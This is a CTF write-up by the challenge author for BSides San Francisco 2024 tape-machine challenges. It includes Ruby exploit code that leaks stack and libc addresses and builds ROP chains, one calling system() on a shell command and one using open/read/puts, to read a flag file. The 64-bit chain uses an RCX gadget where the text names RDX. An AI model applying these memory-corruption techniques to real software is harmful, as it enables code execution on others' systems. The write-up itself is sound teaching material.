This is a write-up for `turing-complete`, `turing-incomplete`, and `turing-incomplete64` from the BSides San Francisco 2024 CTF!

`turing-complete` is a 101-level reversing challenge, and `turing-incomplete` is a much more difficult exploitation challenge with a very similar structure. `turing-incomplete64` is a 64-bit version of `turing-incomplete`, which isn't necessarily harder, but is different.

Let's look at the levels!

## `turing-complete`

My ideas doc said "Turing Machine?" from a long time ago. I don't really remember what I was thinking, but what I decided was to make a simple reversing challenge with a finite tape and 4 operations - go left, go right, read, and write. All commands and responses are binary (`1`s and `0`s), which is hinted at by the instructions being a series of binary bits.

The actual main loop, in C, is quite simple:

```c
  uint8_t tape[128];

  // ...write the flag to the tape...

  for(;;) {
    uint8_t a = r();
    if(a == 2) break;
    uint8_t b = r();
    if(b == 2) break;


    if(a == 0 && b == 0) {
      ptr++;
    } else if(a == 0 && b == 1) {
      ptr--;
    } else if(a == 1 && b == 0) {
      printf("%08b", *ptr);
    } else if(a == 1 && b == 1) {
      uint8_t value = (r() << 7) | (r() << 6) | (r() << 5) | (r() << 4) | (r() << 3) | (r() << 2) | (r() << 1) | (r() << 0);
      *ptr = value;
    }

    fflush(stdout);
  }
```

Since the flag is on the tape, the challenge is straight forward - just read it! That's where' `turing-incomplete` is going to vary :)

Here is my solution with comments:

```ruby
# Connect to the service
s = TCPSocket.new(host, port)

# Read the instructions
s.gets()

# Skip the part of the tape with boring words
1.upto(40) do
  s.write(RIGHT)
end

# Read each character, move right, and convert it to a character
flag = 1.upto(expected_flag().length).map do
  s.write(PRINT + RIGHT)
  s.read(8).to_i(2).chr
end.join
```

## `turing-incomplete`

`turing-incomplete` is exactly the same as `turing-complete`, but with one exception: the flag isn't loaded into the binary. And that's kind of a big deal, because now you have to get code execution!

I also compiled it with all the usual security protections, so you have to overcome ASLR and DEP and stack cookies and everything. But, since we have easy read/write up the stack, those can all be bypassed pretty easily. I also provided a copy of the appropriate `libc.so.6` so you don't have to grab your own copy.

You can grab the solution on the GitHub release, but I'll show and explain each part of it below.

### Stash the command

First, we need to stash a shell command (we're going to use `cat /home/ctf/flag.txt`):

```ruby
# Small offset to align us
s.write(RIGHT * 0x3)

# Use some unused stack space to store our command for later
s.write(RIGHT * 1000)

# Write the command to the stack, one byte at a time
COMMAND = "cat /home/ctf/flag.txt\0"
COMMAND.bytes.each do |b|
  write_8_bits_right(s, b)
end

# Go backwards - this rewinds to a point on the stack where we can reliably find
# a stack reference
s.write(LEFT * (1000 + COMMAND.length - 132))
```

We move the pointer way to the right so we aren't on a park of the stack that isn't going to get overwritten, then write the payload byte by byte.

### Leak a stack address

Second, we leak a stack address; starting with the last line from the previous example:

```ruby
# Go backwards - this rewinds to a point on the stack where we can reliably find
# a stack reference
s.write(LEFT * (1000 + COMMAND.length - 132))

# Read a stack address
STACK_ADDR = read_32_bits_right(s)

# Calculate where our command is, based on the known address and the 1000-byte
# offset
COMMAND_ADDR = STACK_ADDR - 0xc4 + 1000
puts "Command should be @ %x" % COMMAND_ADDR
```

From pure experimentation, I determined that the address 132 bytes from the start of the buffer is a stack address. The value points to 0xc4 bytes after the start of our buffer, so if we subtract 0xc4 then add 1000 bytes, we get a pointe to where our command is in memory. We can pass that value to `system()`, which we'll do later!

### Grab the return address

Third, we leak a libc address (specifically, the return address). Knowing one address in `libc.so.6` will let us determine any other address in `libc.so.6`! So we move up to the return address then read it:

```ruby
# Keep progressing up to the return address
s.write(RIGHT * 40)

# Read the original return address, then go back so we can overwrite it
ACTUAL_RETURN_ADDRESS = read_32_bits_right(s)
s.write(LEFT * 4)
puts 'Return address on the stack: %x' % ACTUAL_RETURN_ADDRESS

# Calculate the base address (ie, start of libc) - that'll let us figure out
# where the functions we want are
BASE_ADDRESS = (ACTUAL_RETURN_ADDRESS - RETURN_ADDRESS)
puts 'Base address: %x' % BASE_ADDRESS
```

### Overwrite the return address

And finally, we overwrite the return address (and ensuing stack addresses) with a very simple ROP chain:

```ruby
# Set up a small ROP chain to call system, then exit
write_32_bits_right(s, BASE_ADDRESS + SYSTEM) # Return address (from main())
write_32_bits_right(s, BASE_ADDRESS + EXIT) # Return address (from system())
write_32_bits_right(s, COMMAND_ADDR) # First argument to system()
write_32_bits_right(s, 0) # Return address (from exit()) - unused
write_32_bits_right(s, 0) # First argument to exit()
```

That'll return to `system()`, with the first parameter set to the address of the command (that we leaked earlier). `system()` will run that command, then return into `exit()` and exit cleanly. That part isn't necessary, I just like being polite!

That's pretty much it! Check out the full solution to see how those functions work, if you like.

## `turing-incomplete64`

`turing-incomplete64` is compiled from the exact same source as `turing-incomplete`, the only different is that it's compiled in 64-bit mode.

The exploit is largely the same as well. The numbers are different, but we leak the stack address and return address and everything identically. The only difference is the actual ROP payload:

```ruby
# Do a 3-element ROP chain - I don't know why system() isn't working, but this
# is!

# *** open(file, 0, 0)
write_64_bits_right(s, BASE_ADDRESS + POP_RDI_RET)
write_64_bits_right(s, COMMAND_ADDR)

write_64_bits_right(s, BASE_ADDRESS + POP_RSI_RET)
write_64_bits_right(s, 0)

write_64_bits_right(s, BASE_ADDRESS + POP_RCX_RET)
write_64_bits_right(s, 0)

write_64_bits_right(s, BASE_ADDRESS + OPEN)

# *** read(5, buffer)
write_64_bits_right(s, BASE_ADDRESS + POP_RDI_RET)
write_64_bits_right(s, 5)

write_64_bits_right(s, BASE_ADDRESS + POP_RSI_RET)
write_64_bits_right(s, COMMAND_ADDR)

write_64_bits_right(s, BASE_ADDRESS + POP_RCX_RET)
write_64_bits_right(s, expected_flag().length)

write_64_bits_right(s, BASE_ADDRESS + READ)

# *** puts(buffer)
write_64_bits_right(s, BASE_ADDRESS + POP_RDI_RET)
write_64_bits_right(s, COMMAND_ADDR)

write_64_bits_right(s, BASE_ADDRESS + PUTS)

# *** exit(0)
write_64_bits_right(s, BASE_ADDRESS + POP_RDI_RET)
write_64_bits_right(s, 0)

write_64_bits_right(s, BASE_ADDRESS + EXIT)

# Tell it we're quitting
s.write("q\n")
```

The first thing you might notice is the `POP_RDI_RET` and `POP_RSI_RET` nonsense - that's because the calling convention for amd64 passes arguments in `rdi`, `rsi`, `rdx`. That's different from x86, which passes arguments on the stack (in most cases). So we need to use a variety of pop + ret functions to set up the registers for each function call.

The other thing you might notice is that we're using `open` / `read` / `puts` instead of `system`. I don't know why `popen` and `system` don't work, but they would crash with a segfault. Those functions can be finnicky sometimes, so I didn't spend a lot of time on them. I considered using `mprotect`, like I did with another challenge, but decided to take the easy approach - just read the file and print it.

And it worked!

## Conclusion

That's it! Hope you enjoyed this write-up!
